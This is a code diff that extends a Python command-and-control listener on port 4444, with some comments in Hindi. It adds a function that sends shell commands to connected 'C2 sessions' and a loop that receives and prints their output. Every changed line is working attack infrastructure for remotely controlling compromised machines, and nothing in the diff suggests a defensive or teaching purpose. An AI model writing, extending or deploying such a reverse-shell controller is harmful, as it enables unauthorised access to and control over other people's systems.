@@ -8,6 +8,7 @@ import threading
 from typing import Dict, Tuple, Optional
 from rich.console import Console
 from rich.table import Table
+from rich.prompt import Prompt
 from rich import box
 
 console = Console()
@@ -30,12 +31,18 @@ def handle_client(client_socket: socket.socket, addr: Tuple[str, int]) -> None:
 
     try:
         while is_running:
-            data = client_socket.recv(4096)
-            if not data:
-                break
-            # Additional output processing logic can be integrated here
-    except socket.timeout:
-        pass
+            # यहाँ क्लाइंट से आने वाले डेटा को रिसीव किया जा रहा है
+            client_socket.settimeout(0.5)
+            try:
+                data = client_socket.recv(4096)
+                if not data:
+                    break
+                # आउटपुट प्रिंट करें या लॉग करें
+                output = data.decode('utf-8', errors='ignore')
+                if output.strip():
+                    console.print(f"\n[cyan][{client_id} output]:[/]\n{output}")
+            except socket.timeout:
+                continue
     except Exception:
         pass
     finally:
@@ -49,6 +56,23 @@ def handle_client(client_socket: socket.socket, addr: Tuple[str, int]) -> None:
                 del active_connections[client_id]
 
         console.print(f"\n[bold red][-] Session {client_id} disconnected.[/]")
+
+
+def send_command_to_session(client_id: str, command: str) -> bool:
+    """Send a shell command to a specific active C2 session."""
+    with connection_lock:
+        sock = active_connections.get(client_id)
+        if not sock:
+            console.print(f"[bold red]✗ Session {client_id} not found or inactive.[/]")
+            return False
+
+        try:
+            sock.sendall((command + "\n").encode('utf-8'))
+            console.print(f"[bold green]✓ Command sent to {client_id}: {command}[/]")
+            return True
+        except Exception as e:
+            console.print(f"[bold red]✗ Failed to send command to {client_id}: {e}[/]")
+            return False
 
 
 def start_listener(port: int = 4444) -> None:
@@ -69,7 +93,7 @@ def start_listener(port: int = 4444) -> None:
         def server_loop() -> None:
             while is_running and server_socket:
                 try:
-                    server_socket.settimeout(1.0)  # Allows periodic check of is_running flag
+                    server_socket.settimeout(1.0)
                     client, addr = server_socket.accept()
                     t = threading.Thread(target=handle_client, args=(client, addr), daemon=True)
                     t.start()
